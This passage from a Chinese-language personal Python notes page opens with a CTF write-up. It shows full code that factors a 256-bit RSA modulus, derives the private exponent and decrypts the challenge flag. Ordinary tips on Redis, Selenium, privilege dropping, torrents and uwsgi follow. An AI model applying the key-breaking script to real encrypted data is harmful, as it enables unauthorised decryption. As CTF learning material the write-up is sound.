        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="k">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>

<span class="n">def</span> <span class="n">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
    <span class="k">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
    <span class="k">if</span> <span class="k">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">raise</span> <span class="k">Exception</span><span class="p">(</span><span class="s1">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>

<span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
<span class="n">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
</code></pre></div>


<p>上述python将输出34458919248694250828820386546500026880096887166581679876896066449320377773297， 真是一个好大的d啊。。。</p>
<h4 id="flagencint">怎么把flag.enc当成一个int读入？<a class="headerlink" href="#flagencint" title="Permanent link">&para;</a></h4>
<p>试图用记事本打开flag.enc，乱码了；那用二进制形式打开flag.inc文件看看：
<img alt="" src="https://d.py3.io/img/15365186860.png" /></p>
<p>emmm一共32字节长的密文，直接读文件将得到bytes strig，怎么把它转为一个很大的整数呢？</p>
<p>google关键词： python byte string to int</p>
<p>参考：https://stackoverflow.com/questions/444591/convert-a-string-of-bytes-into-an-int-python</p>
<p>人家给出了python3.2以后可以用int.from_bytes的方式，继续写我们的py咯：</p>
<div class="codehilite"><pre><span></span><code><span class="err">encrypteddata = open(&#39;flag.enc&#39;,&#39;rb&#39;).read()</span>
<span class="err">c = int.from_bytes(encrypteddata, &#39;big&#39;)</span>
<span class="err">print(c)</span>
</code></pre></div>


<p>这里的&rsquo;big&rsquo;表示大端存放的方式，就是最重要的那一位是靠左边的</p>
<p>插一句：通过询问其他大佬，我也折腾出了一种naive的方法——使用binascii模块先转为hex编码，然后hex按16字节转int:</p>
<div class="codehilite"><pre><span></span><code><span class="n">encrypteddata</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.enc&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">encrypteddata</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</code></pre></div>


<h4 id="_11">计算明文<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
<p>公式（密码学肯定要考的，所以再记一次咯）</p>
<div class="codehilite"><pre><span></span><code><span class="err">m = c^d (mod n)</span>
</code></pre></div>


<p>问题来了，d是个那么大的数，如果直接写一个：</p>
<div class="codehilite"><pre><span></span><code><span class="err"># 在python里**表示乘方</span>
<span class="err">m = (c**d)%n</span>
</code></pre></div>


<p>果然运行这个py就卡死了，实际上并没有必要算出精确的c**d，我们需要调用快速的mod乘方的方法</p>
<p>google关键词： python mod pow</p>
<p>参考：https://stackoverflow.com/questions/32738637/calculate-mod-using-pow-function-python</p>
<p>人家说pow函数就可以提供第3个参数，例如pow(6, 8, 5)就是 6^8 mod 5</p>
<p>那就写代码咯(瞎写，C语言的pow需要#include <math.h> 那我就也从math导入吧)：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="nb">pow</span>
<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
</code></pre></div>


<p>然而命途多舛，果然报错：</p>
<div class="codehilite"><pre><span></span><code><span class="err">Traceback (most recent call last):</span>
<span class="err">  File &quot;run.py&quot;, line 35, in &lt;module&gt;</span>
<span class="err">    m = pow(c,d,n)</span>
<span class="c">TypeError: pow expected 2 arguments, got 3</span>
</code></pre></div>


<p>emmm&hellip; 奇了怪了，这是什么鬼嘛，说好的支持第三个参数呢，翻回去仔细看人家给的<a href="https://docs.python.org/3/library/functions.html#pow">文档链接</a></p>
<p>嗯？这文档的标题就是Built-in Functions，我懂了！ 支持第三个参数的pow函数是内置的那个，而不是math库提供的，删掉<code>from math import pow</code>这一句就好了</p>
<p>我们的py又加上了两行：</p>
<div class="codehilite"><pre><span></span><code><span class="err">m = pow(c,d,n)</span>
<span class="err">print(m)</span>
</code></pre></div>


<p>得到输出 4114174865819530012247735243997890458185276719507135882385278623252053258</p>
<h3 id="flag">明文这么一个大数 我要的flag呢？<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
<p>cy打开了他的笔记本 <a href="https://py3.io/Python.html#bytes">https://py3.io/Python.html#bytes</a></p>
<p>查到了 十六进制字符串转bytes字符串 和 拿到一个int转字符串 的方法：</p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16decode</span>
<span class="k">print</span><span class="p">(</span> <span class="n">b16decode</span><span class="p">(</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="p">)</span> <span class="p">)</span>
</code></pre></div>


<p>果然 又tm出错了：</p>
<div class="codehilite"><pre><span></span><code><span class="err">Traceback (most recent call last):</span>
<span class="err">  File &quot;run.py&quot;, line 37, in &lt;module&gt;</span>
<span class="err">    print( b16decode( hex(m)[2:].upper() ) )</span>
<span class="err">  File &quot;/usr/lib/python3.5/base64.py&quot;, line 276, in b16decode</span>
<span class="err">    return binascii.unhexlify(s)</span>
<span class="err">binascii.Error: Odd-length string</span>
</code></pre></div>


<p>odd-length啥意思？奇数长度？对噢 十六进制字符串肯定要偶数长度才行（两个一组表示一个字节嘛） 那么就前面补个0咯</p>
<p>py代码如下：（其实你也可以试试int.to_bytes方法）</p>
<div class="codehilite"><pre><span></span><code><span class="err">plaindata = hex(m)[2:].upper()</span>
<span class="err">if len(plaindata)%2 :</span>
<span class="err">    plaindata = &quot;0&quot;+plaindata</span>
<span class="err">print(b16decode(plaindata))</span>
</code></pre></div>


<p>输出：</p>
<div class="codehilite"><pre><span></span><code><span class="err">b&#39;\x02T\x1b:(\x02\xb9\x8c8\xbb\x00CTF{256i3_n0t_SAfe}\n&#39;</span>
</code></pre></div>


<p>啊哈！ 总算能搞定啦，flag到手！</p>
<h3 id="_12">完整的代码<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="c1"># parse public key: https://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key</span>
<span class="c1"># PUBKEY=`grep -v -- ----- public.pem | tr -d &#39;\n&#39;`</span>
<span class="c1"># echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i</span>
<span class="c1"># echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17</span>


<span class="n">n</span> <span class="o">=</span> <span class="mh">0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
<span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span>
<span class="k">print</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
<span class="c1"># visit http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831</span>
<span class="n">p</span> <span class="o">=</span> <span class="mi">283194537446483890135816972554288437117</span>
<span class="n">q</span> <span class="o">=</span> <span class="mi">319567913424286672035093410391626922443</span>

<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
<span class="n">encrypteddata</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.enc&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">encrypteddata</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
<span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">encrypteddata</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16decode</span>
<span class="n">plaindata</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaindata</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span> <span class="p">:</span>
    <span class="n">plaindata</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="o">+</span><span class="n">plaindata</span>

<span class="k">print</span><span class="p">(</span><span class="n">b16decode</span><span class="p">(</span><span class="n">plaindata</span><span class="p">))</span>
</code></pre></div>


<hr />
<h2 id="_13">时间戳与字符串相互转换<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
<p>import time</p>
<p>得到当前时间戳： int(time.time())</p>
<p>得到当前时间字符串：time.strftime(&ldquo;%Y-%m-%d %H:%M:%S&rdquo;)</p>
<p>时间戳1381419600转字符串：time.strftime(&ldquo;%Y-%m-%d %H:%M:%S&rdquo;, time.localtime(1381419600))</p>
<p>字符串&rdquo;2013-10-10 23:40:00&rdquo;转时间戳：int(time.mktime(time.strptime(&ldquo;2013-10-10 23:40:00&rdquo;,&rdquo;%Y-%m-%d %H:%M:%S&rdquo;)))</p>
<hr />
<h2 id="redis">用redis存储字典<a class="headerlink" href="#redis" title="Permanent link">&para;</a></h2>
<p>假设存储一个用户名对应用户ID的字典，名称为USERS，例如{&ldquo;zhangsan&rdquo;:1, &ldquo;lisi&rdquo;:2}</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">redis</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">StrictRedis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#db参数可以理解为命名空间</span>
<span class="k">assert</span> <span class="n">r</span><span class="o">.</span><span class="n">ping</span><span class="p">()</span> <span class="c1"># 是否成功连上</span>

<span class="n">USERS</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;zhangsan&quot;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;lisi&quot;</span><span class="p">:</span><span class="mi">2</span><span class="p">}</span>

<span class="c1"># 存储字典</span>
<span class="n">r</span><span class="o">.</span><span class="n">hmset</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span> <span class="n">USERS</span><span class="p">)</span>

<span class="c1"># 获得已经存储的字典里面有哪些键，返回bytes的list</span>
<span class="n">KEYS</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hkeys</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">)</span> 

<span class="c1"># 获得整个字典并转换回原来的类型</span>
<span class="n">USERS1</span> <span class="o">=</span> <span class="p">{</span><span class="n">i</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span><span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">hgetall</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">items</span><span class="p">()}</span>

<span class="c1"># 修改字典中一个key的value</span>
<span class="n">r</span><span class="o">.</span><span class="n">hset</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span><span class="s2">&quot;zhangsan&quot;</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>

<span class="c1"># 删除存储的字典，只能一个个删，先要hkeys获取有哪些键</span>
<span class="n">_</span><span class="o">=</span><span class="p">[</span><span class="n">r</span><span class="o">.</span><span class="n">hdel</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span> <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">hkeys</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">)</span> <span class="p">]</span>

<span class="c1"># 扫描式获得已经存储的字典里面有哪些键</span>
<span class="c1">## 如果字典里面存储了太多东西，执行KEYS会卡住整个redis，用hscan是更好的选择</span>
<span class="c1">## 这里先生成一个比较大的字典存进去</span>
<span class="kn">import</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">string</span>
<span class="n">randomstr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span>
<span class="n">USERS</span> <span class="o">=</span> <span class="p">{</span><span class="n">randomstr</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">)}</span> <span class="c1"># 生成一个1w条记录的字典</span>
<span class="n">r</span><span class="o">.</span><span class="n">hmset</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span> <span class="n">USERS</span><span class="p">)</span> <span class="c1"># 存进去</span>

<span class="c1">## 循环hscan</span>
<span class="n">cursor</span><span class="p">,</span> <span class="n">result</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hscan</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">)</span>
<span class="k">while</span> <span class="n">cursor</span><span class="p">:</span>
    <span class="n">cursor</span><span class="p">,</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hscan</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span> <span class="n">cursor</span><span class="p">)</span>
    <span class="n">result</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>

<span class="n">USERS2</span> <span class="o">=</span> <span class="p">{</span><span class="n">i</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span><span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span> <span class="ow">in</span> <span class="n">result</span><span class="o">.</span><span class="n">items</span><span class="p">()}</span> <span class="c1">#从bytes转为原来的格式</span>
<span class="k">assert</span> <span class="n">USERS</span><span class="o">==</span><span class="n">USERS2</span> <span class="c1">#存进去的与取出来的应该相同</span>
</code></pre></div>


<hr />
<h2 id="nexushd">搬运种子 从北邮人搬运到NexusHD<a class="headerlink" href="#nexushd" title="Permanent link">&para;</a></h2>
<p>代码： <a href="../code/autoseed_byr2nhd.py">code/autoseed_byr2nhd.py</a></p>
<p>依赖于<a href="https://github.com/zjuchenyuan/EasyLogin">EasyLogin</a>，以及 <code>pip3 install transmissionrpc python-resize-image</code></p>
<p>运行需要提供byr和NHD的登录cookie，以及transmission连接信息</p>
<hr />
<h2 id="python-seleniumdocker-chrome-headless">python selenium+Docker chrome headless爬复杂网页<a class="headerlink" href="#python-seleniumdocker-chrome-headless" title="Permanent link">&para;</a></h2>
<p>例子：阿里云所有域名价格页面 https://wanwang.aliyun.com/help/price.html</p>
<p>从网络请求看出其价格接口有多个，而且较为复杂；那就不妨试试用selenium让chrome headless访问这个页面，加载渲染完成后我们再获取页面源代码，此时源代码里面就有了完整的价格数据</p>
<p>运行环境：只需要Docker和Python3，无需桌面环境</p>
<p>镜像参考：https://hub.docker.com/r/selenium/standalone-chrome/</p>
<p>先跑起来容器呗，这样就运行了selenium server，主机暴露了一个6666端口，：</p>
<div class="codehilite"><pre><span></span><code><span class="err">docker run -d -p 6666:4444 -v /dev/shm:/dev/shm selenium/standalone-chrome</span>
</code></pre></div>


<p>安装Python包：<code>pip3 install selenium</code></p>
<p>调用代码，爬取url，得到网页源代码，其中127.0.0.1相应地修改为Docker主机的IP:</p>
<div class="codehilite"><pre><span></span><code><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://wanwang.aliyun.com/help/price.html&quot;</span>

<span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span> <span class="nn">selenium.webdriver.common.desired_capabilities</span> <span class="kn">import</span> <span class="n">DesiredCapabilities</span>
<span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Remote</span><span class="p">(</span>
    <span class="n">command_executor</span><span class="o">=</span><span class="s1">&#39;http://127.0.0.1:6666/wd/hub&#39;</span><span class="p">,</span>
    <span class="n">desired_capabilities</span><span class="o">=</span><span class="n">DesiredCapabilities</span><span class="o">.</span><span class="n">CHROME</span><span class="p">)</span>
<span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="n">html</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">page_source</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;result.html&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span>
        <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
<span class="n">driver</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span> <span class="c1">#一定要记得清理掉Chrome进程 否则内存会占满</span>
</code></pre></div>


<p>如果没有在代码里面清理Chrome进程，可以在浏览器里面进入Console，在这里可以看到当前运行的Session (Chrome进程) ，对当前页面查看页面截图：
http://127.0.0.1:6666/wd/hub/static/resource/hub.html</p>
<hr />
<h2 id="pythonroot">python丢弃root权限<a class="headerlink" href="#pythonroot" title="Permanent link">&para;</a></h2>
<p>如果python需要监听80端口，简单方式就是直接用root权限启动，但启动后可以丢弃root权限来提高安全性</p>
<p>code from https://stackoverflow.com/questions/2699907/dropping-root-permissions-in-python</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">pwd</span><span class="o">,</span> <span class="nn">grp</span>

<span class="k">def</span> <span class="nf">drop_privileges</span><span class="p">(</span><span class="n">uid_name</span><span class="o">=</span><span class="s1">&#39;nobody&#39;</span><span class="p">,</span> <span class="n">gid_name</span><span class="o">=</span><span class="s1">&#39;nogroup&#39;</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">getuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="c1"># We&#39;re not root so, like, whatever dude</span>
        <span class="k">return</span>

    <span class="c1"># Get the uid/gid from the name</span>
    <span class="n">running_uid</span> <span class="o">=</span> <span class="n">pwd</span><span class="o">.</span><span class="n">getpwnam</span><span class="p">(</span><span class="n">uid_name</span><span class="p">)</span><span class="o">.</span><span class="n">pw_uid</span>
    <span class="n">running_gid</span> <span class="o">=</span> <span class="n">grp</span><span class="o">.</span><span class="n">getgrnam</span><span class="p">(</span><span class="n">gid_name</span><span class="p">)</span><span class="o">.</span><span class="n">gr_gid</span>

    <span class="c1"># Remove group privileges</span>
    <span class="n">os</span><span class="o">.</span><span class="n">setgroups</span><span class="p">([])</span>

    <span class="c1"># Try setting the new uid/gid</span>
    <span class="n">os</span><span class="o">.</span><span class="n">setgid</span><span class="p">(</span><span class="n">running_gid</span><span class="p">)</span>
    <span class="n">os</span><span class="o">.</span><span class="n">setuid</span><span class="p">(</span><span class="n">running_uid</span><span class="p">)</span>
</code></pre></div>


<hr />
<h2 id="python-transmissionrpc">python transmissionrpc<a class="headerlink" href="#python-transmissionrpc" title="Permanent link">&para;</a></h2>
<p>下述主要介绍<a href="https://pythonhosted.org/transmissionrpc/">transmissionrpc</a>这个库的使用</p>
<h3 id="_14">上传一个种子 开始下载<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<p>使用Client的add_torrent方法，传入种子文件的base64</p>
<div class="codehilite"><pre><span></span><code><span class="n">def</span> <span class="n">upload_transmission</span><span class="p">(</span><span class="n">thost</span><span class="p">,</span> <span class="n">tport</span><span class="p">,</span> <span class="n">tuser</span><span class="p">,</span> <span class="n">tpassword</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
    <span class="n">tc</span> <span class="o">=</span> <span class="n">transmissionrpc</span><span class="o">.</span><span class="n">Client</span><span class="p">(</span><span class="n">thost</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">tport</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">tuser</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">tpassword</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">tc</span><span class="o">.</span><span class="n">add_torrent</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</code></pre></div>


<p>返回值是一个不完整的torrent对象</p>
<h3 id="torrent">获取完整的torrent对象<a class="headerlink" href="#torrent" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="err">torrent_id = torrent.id</span>
<span class="err">full_torrent = tc.get_torrent(torrent_id)</span>
</code></pre></div>


<p>其中就有状态和进度信息</p>
<div class="codehilite"><pre><span></span><code><span class="err">print(full_torrent.status, full_torrent.progress)</span>
</code></pre></div>


<h3 id="tracker">给种子增加一个tracker<a class="headerlink" href="#tracker" title="Permanent link">&para;</a></h3>
<p>这样可以把pt站点的种子转到OpenTracker，无需重新校验种子（但传到新的pt站点infohash会变，只能传新种子重新校验）</p>
<p>transmissionrpc本身似乎没有暴露出trackerAdd的方法，这是结合浏览器和翻阅代码自己试出来的</p>
<div class="codehilite"><pre><span></span><code><span class="n">torrent</span><span class="p">.</span><span class="n">_client</span><span class="p">.</span><span class="n">_request</span><span class="p">(</span><span class="s1">&#39;torrent-set&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">{</span><span class="ss">&quot;trackerAdd&quot;</span><span class="err">:</span><span class="w"> </span><span class="o">[</span><span class="n">new_tracker_url</span><span class="o">]</span><span class="err">}</span><span class="p">,</span><span class="w"> </span><span class="n">torrent</span><span class="p">.</span><span class="n">id</span><span class="p">,</span><span class="w"> </span><span class="k">True</span><span class="p">)</span><span class="w"></span>
</code></pre></div>


<h3 id="torrenttracker">修改一个.torrent文件的tracker<a class="headerlink" href="#torrenttracker" title="Permanent link">&para;</a></h3>
<p>使用torf库，这个库使用了python3.6才支持的特性，依赖于格式化字符串、dict遍历的有序性</p>
<p>我修改后的版本下载，支持py3.5：https://d.py3.io/torf.zip</p>
<p>代码：</p>
<div class="codehilite"><pre><span></span><code><span class="n">t</span><span class="o">=</span><span class="n">torf</span><span class="p">.</span><span class="n">Torrent</span><span class="p">.</span><span class="k">read</span><span class="p">(</span><span class="n">torrent_filename</span><span class="p">)</span><span class="w"></span>
<span class="n">t</span><span class="p">.</span><span class="n">trackers</span><span class="o">=[</span><span class="n">[new_tracker_url</span><span class="o">]</span><span class="err">]</span><span class="w"></span>
<span class="n">t</span><span class="p">.</span><span class="k">write</span><span class="p">(</span><span class="ss">&quot;new.torrent&quot;</span><span class="p">)</span><span class="w"></span>
</code></pre></div>


<hr />
<h2 id="uwsgi">uwsgi优雅重启<a class="headerlink" href="#uwsgi" title="Permanent link">&para;</a></h2>
<p>参考：http://uwsgi-docs.readthedocs.io/en/latest/articles/TheArtOfGracefulReloading.html</p>
<p>在uwsgi.ini中添加一行：</p>
<div class="codehilite"><pre><span></span><code><span class="err">master-fifo = /tmp/uwsgififo</span>
</code></pre></div>


<p>需要重启的时候就：</p>
<div class="codehilite"><pre><span></span><code><span class="err">echo r&gt;/tmp/uwsgififo</span>
</code></pre></div>


<p>文件打开方式必须是&rdquo;w&rdquo;而不能是&rdquo;a&rdquo;：</p>
<div class="codehilite"><pre><span></span><code><span class="err">open(&quot;/tmp/uwsgififo&quot;, &quot;w&quot;).write(&quot;r&quot;)</span>
</code></pre></div>


<h2 id="flask">flask设置一堆静态目录<a class="headerlink" href="#flask" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">Blueprint</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">Markup</span>
